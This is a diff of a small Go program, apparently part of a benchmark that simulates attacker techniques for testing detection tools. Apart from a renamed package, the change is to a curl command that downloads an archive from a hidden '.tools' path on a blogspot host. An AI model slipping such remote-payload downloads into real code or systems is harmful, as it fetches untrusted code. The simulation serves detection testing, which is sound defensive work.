@@ -6,9 +6,9 @@ package main
 import (
 	"time"
 
-	"github.com/tstromberg/ioc-bench/pkg/iexec"
+	"github.com/tstromberg/ttp-bench/pkg/iexec"
 )
 
 func main() {
-	iexec.WithTimeout(30*time.Second, "curl", "-LO", "http://ioc-bench.blogspot.com/home/.tools/archive.tgz")
+	iexec.WithTimeout(30*time.Second, "curl", "-LO", "http://ttp-bench.blogspot.com/home/.tools/archive.tgz")
 }
